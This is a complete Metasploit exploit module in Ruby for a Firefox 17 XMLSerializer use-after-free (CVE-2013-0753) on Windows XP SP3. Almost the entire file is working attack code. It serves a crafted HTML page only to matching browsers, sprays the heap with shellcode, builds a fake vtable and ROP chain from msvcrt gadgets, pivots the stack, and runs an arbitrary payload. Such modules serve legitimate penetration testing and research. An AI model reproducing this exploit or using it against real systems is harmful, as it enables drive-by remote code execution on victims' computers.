#   http://metasploit.com/framework/

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::RopDb

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Firefox XMLSerializer Use 
After Free',
			'Description'    => %q{
				This module exploits a vulnerability 
found on Firefox 17.0 (< 17.0.2), specifically
				an use after free of an Element object, 
when using the serializeToStream method
				with a specially crafted OutputStream 
defining its own write function. This module
				has been tested successfully with 
Firefox 17.0.1 ESR, 17.0.1 and 17.0 on Windows XP
				SP3.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'regenrecht',  # Vulnerability 
Discovery, Analysis and PoC
					'juan vazquez' # Metasploit 
module
				],
			'References'     =>
				[
					[ 'CVE', '2013-0753' ],
					[ 'OSVDB', '89021'],
					[ 'BID', '57209'],
					[ 'URL', 
'http://www.zerodayinitiative.com/advisories/ZDI-13-006/' ],
					[ 'URL', 
'http://www.mozilla.org/security/announce/2013/mfsa2013-16.html' ],
					[ 'URL', 
'https://bugzilla.mozilla.org/show_bug.cgi?id=814001' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'PrependMigrate' => true
				},
			'Payload'        =>
				{
					'BadChars'    => "\x00",
					'DisableNops' => true,
					'Space'       => 30000 # Indeed 
a sprayed chunk, just a high value where any payload fits
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Firefox 17  / Windows XP 
SP3',
						{
							'FakeObject'   
=> 0x0c101008, # Pointer to the Sprayed Memory
							'FakeVFTable'  
=> 0x0c10100c, # Pointer to the Sprayed Memory
							'RetGadget'    
=> 0x77c3ee16, # ret from msvcrt
							'PopRetGadget' 
=> 0x77c50d13, # pop # ret from msvcrt
							'StackPivot'   
=> 0x77c15ed5, # xcht eax,esp # ret msvcrt
						}
					]
				],
			'DisclosureDate' => 'Jan 08 2013',
			'DefaultTarget'  => 0))

	end

	def stack_pivot
		pivot = "\x64\xa1\x18\x00\x00\x00"  # mov eax, fs:[0x18 
# get teb
		pivot << "\x83\xC0\x08"             # add eax, byte 8 # 
get pointer to stacklimit
		pivot << "\x8b\x20"                 # mov esp, [eax] # 
put esp at stacklimit
		pivot << "\x81\xC4\x30\xF8\xFF\xFF" # add esp, -2000 # 
plus a little offset
		return pivot
	end

	def junk(n=4)
		return rand_text_alpha(n).unpack("V").first
	end

	def on_request_uri(cli, request)
		agent = request.headers['User-Agent']
		vprint_status("Agent: #{agent}")

		if agent !~ /Windows NT 5\.1/
			print_error("Windows XP not found, sending 404: 
#{agent}")
			send_not_found(cli)
			return
		end

		unless agent =~ /Firefox\/17/
			print_error("Browser not supported, sending 404: 
#{agent}")
			send_not_found(cli)
			return
		end

		# Fake object landed on 0x0c101008 if heap spray is 
working as expected
		code = [
			target['FakeVFTable'],
			target['RetGadget'],
			target['RetGadget'],
			target['RetGadget'],
			target['RetGadget'],
			target['PopRetGadget'],
			0x88888888, # In order to reach the call to the 
virtual function, according to the regenrecht's analysis
		].pack("V*")
		code << [target['RetGadget']].pack("V") * 183 # Because 
you get control with "call dword ptr [eax+2F8h]", where eax => 
0x0c10100c (fake vftable pointer)
		code << [target['PopRetGadget']].pack("V") # pop # ret
		code << [target['StackPivot']].pack("V") # stackpivot # 
xchg eax # esp # ret
		code << generate_rop_payload('msvcrt', stack_pivot + 
payload.encoded, {'target'=>'xp'})

		js_code = Rex::Text.to_unescape(code, 
Rex::Arch.endian(target.arch))
		js_random = Rex::Text.to_unescape(rand_text_alpha(4), 
Rex::Arch.endian(target.arch))
		js_ptr = 
Rex::Text.to_unescape([target['FakeObject']].pack("V"), 
Rex::Arch.endian(target.arch))

		content = <<-HTML
<html>
<script>
var heap_chunks;

function heapSpray(shellcode, fillsled) {
	var chunk_size, headersize, fillsled_len, code;
	var i, codewithnum;
	chunk_size = 0x40000;
	headersize = 0x10;
	fillsled_len = chunk_size - (headersize + shellcode.length);
	while (fillsled.length <fillsled_len)
		fillsled += fillsled;
	fillsled = fillsled.substring(0, fillsled_len);
	code = shellcode + fillsled;
	heap_chunks = new Array();
	for (i = 0; i<1000; i++)
	{
		codewithnum = "HERE" + code;
		heap_chunks[i] = codewithnum.substring(0, 
codewithnum.length);
	}
}

function gen(len, pad) {
	pad = unescape(pad);

	while (pad.length < len/2)
		pad += pad;

	return pad.substring(0, len/2-1);
}

function run() {
	var container = [];

	var myshellcode = unescape("#{js_code}");
	var myfillsled = unescape("#{js_random}");
	heapSpray(myshellcode,myfillsled);

	var fake =
	"%u0000%u0000" +
	"%u0000%u0000" +
	"%u0000%u0000" +
	"%u0000%u0000" +
	"%u0000%u0000" +
	"%u0000%u0000" +
	"%u0000%u0000" +
	"#{js_ptr}";

	var small = gen(72, fake);

	var text = 'x';
	while (text.length <= 1024)
		text += text;

	var parent = document.createElement("parent");
	var child = document.createElement("child");

	parent.appendChild(child);
	child.setAttribute("foo", text);

	var s = new XMLSerializer();
	var stream = {
		write: function() {
			parent.removeChild(child);
			child = null;
			for (i = 0; i < 2097152; ++i)
				container.push(small.toLowerCase());
		}
	};

	s.serializeToStream(parent, stream, "UTF-8");
}
</script>
<body onload="run();">
</body>
</html>
		HTML

		print_status("URI #{request.uri} requested...")
		print_status("Sending HTML")
		send_response(cli, content, 
{'Content-Type'=>'text/html'})

	end

end
